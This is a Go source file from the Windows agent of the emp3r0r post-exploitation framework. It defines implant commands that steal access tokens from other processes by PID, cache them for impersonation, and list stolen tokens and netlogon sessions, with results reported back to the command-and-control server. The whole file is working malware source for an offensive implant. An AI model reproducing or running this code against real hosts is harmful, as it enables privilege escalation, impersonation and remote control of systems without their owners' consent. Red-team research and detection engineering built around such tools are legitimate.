//go:build windows

package handler

import (
	"fmt"
	"strconv"
	"time"

	"github.com/fxamacker/cbor/v2"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/priv"
	"github.com/jm33-m0/emp3r0r/core/lib/syscall"
	"github.com/spf13/cobra"
	"golang.org/x/sys/windows"
)

func platformCommands(cmd *cobra.Command) {
	// !steal_token
	stealTokenCmd := &cobra.Command{
		Use:     def.C2CmdStealToken,
		Short:   "Steal token from process; store in memory for future use",
		Example: fmt.Sprintf("%s --pid <pid> [--token <sid>]", def.C2CmdStealToken),
		GroupID: "windows",
		Run:     runStealToken,
	}
	stealTokenCmd.Flags().StringP("pid", "", "", "PID of the process to steal token from")
	stealTokenCmd.Flags().StringP("token", "", "", "SID of an existing cached token to impersonate before stealing")
	cmd.AddCommand(stealTokenCmd)

	// !list_tokens
	listTokensCmd := &cobra.Command{
		Use:     def.C2CmdListTokens,
		Short:   "List all cached impersonation tokens with friendly names",
		Example: def.C2CmdListTokens,
		GroupID: "windows",
		Run:     runListTokens,
	}
	listTokensCmd.Flags().BoolP("quiet", "q", false, "Suppress printing the result (used by command completion)")
	cmd.AddCommand(listTokensCmd)

	// !list_sessions
	listSessionsCmd := &cobra.Command{
		Use:     def.C2CmdListSessions,
		Short:   "List all netlogon logon sessions created by the --user module option",
		Example: def.C2CmdListSessions,
		GroupID: "windows",
		Run:     runListSessions,
	}
	listSessionsCmd.Flags().BoolP("quiet", "q", false, "Suppress printing the result (used by command completion)")
	cmd.AddCommand(listSessionsCmd)
}

func runStealToken(cmd *cobra.Command, args []string) {
	pidStr, _ := cmd.Flags().GetString("pid")
	if pidStr == "" {
		c2transport.NotifyC2(cmd, "Error: args error: PID is required: %s", args)
		return
	}
	pid, err := strconv.Atoi(pidStr)
	if err != nil {
		c2transport.NotifyC2(cmd, "Error: args error: PID is invalid: %s", args)
		return
	}

	// If an existing token SID is provided, pass its handle to StealToken
	// so it can impersonate before opening the target process.
	tokenSID, _ := cmd.Flags().GetString("token")
	var hExisting windows.Handle
	if tokenSID != "" {
		raw, ok := priv.TokenMap.Load(tokenSID)
		if !ok {
			c2transport.NotifyC2(cmd, "Error: token not found for SID %q", tokenSID)
			return
		}
		var ok2 bool
		hExisting, ok2 = raw.(windows.Handle)
		if !ok2 {
			c2transport.NotifyC2(cmd, "Error: invalid token handle for SID %q", tokenSID)
			return
		}
	}

	hToken, err := priv.StealToken(syscall.RuntimeSyscallTable, uint32(pid), hExisting)
	if err != nil {
		c2transport.NotifyC2(cmd, "%s", err.Error())
		return
	}
	sid, err := priv.GetTokenUserSid(hToken)
	if err != nil {
		c2transport.NotifyC2(cmd, "%s", err.Error())
		return
	}
	priv.TokenMap.Store(sid, hToken)
	friendly := priv.GetTokenFriendlyName(hToken)
	c2transport.NotifyC2(cmd, "Successfully stole token for %s", friendly)
}

func runListTokens(cmd *cobra.Command, _ []string) {
	entries := make([]def.TokenEntry, 0)
	priv.TokenMap.Range(func(key, value any) bool {
		sid, ok := key.(string)
		if !ok {
			return true
		}
		hToken, ok := value.(windows.Handle)
		if !ok {
			entries = append(entries, def.TokenEntry{Key: sid, FriendlyName: "<invalid handle>"})
			return true
		}
		// Netlogon sessions are stored in TokenMap under their session name
		// so they can be used via the universal "token" option; mark them.
		_, isSession := priv.GetSession(sid)
		entries = append(entries, def.TokenEntry{
			Key:          sid,
			FriendlyName: priv.GetTokenFriendlyName(hToken),
			IsSession:    isSession,
		})
		return true
	})

	// Structured (CBOR) response so the CC can complete and render without
	// parsing text; an empty list is sent as-is ("No cached tokens" is
	// rendered CC-side from the length).
	data, err := cbor.Marshal(entries)
	if err != nil {
		c2transport.NotifyC2(cmd, "Error marshaling tokens: %v\n", err)
		return
	}
	c2transport.NotifyC2Binary(cmd, data)
}

// runListSessions implements !list_sessions
func runListSessions(cmd *cobra.Command, _ []string) {
	entries := make([]def.SessionEntry, 0)
	priv.SessionMap.Range(func(key, value any) bool {
		session, ok := value.(*priv.LogonSession)
		if !ok {
			return true
		}
		entries = append(entries, def.SessionEntry{
			Name:      session.Name,
			User:      session.User,
			Domain:    session.Domain,
			LogonID:   session.LogonID,
			CreatedAt: session.CreatedAt.Format(time.RFC3339),
		})
		return true
	})

	data, err := cbor.Marshal(entries)
	if err != nil {
		c2transport.NotifyC2(cmd, "Error marshaling sessions: %v\n", err)
		return
	}
	c2transport.NotifyC2Binary(cmd, data)
}
